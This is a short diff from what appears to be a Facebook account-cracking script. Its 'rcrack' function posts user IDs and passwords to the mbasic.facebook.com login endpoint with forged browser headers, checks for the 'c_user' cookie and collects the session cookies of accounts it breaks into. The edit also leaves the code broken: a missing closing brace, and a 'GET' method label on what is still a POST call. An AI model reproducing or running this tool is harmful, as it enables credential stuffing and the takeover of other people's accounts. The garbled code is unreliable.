@@ -307,8 +307,9 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {'authority':'mbasic.facebook.com'
-            'method':'POST',
-            'scheme':'https',
+            'method': 'GET',
+            'path': '/login/device-based/login/async/',
+            'scheme': 'https',
             'accept':'text/html,application/xhtml+xml,application/xml;q-0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.9',
             'accept-encoding':'gzip, deflate, br',
             'accept-language':'en-GB, en-US;q=0.9,en;q=0.8',
@@ -326,8 +327,8 @@ def rcrack(uid,pwx,tl):
             'pragma':'no-cache',
             'priority':'u=0',
             'upgrade-insecure-requests':'1',
-			'user-agent': pro}
-			lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+	    'user-agent': pro
+	    lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
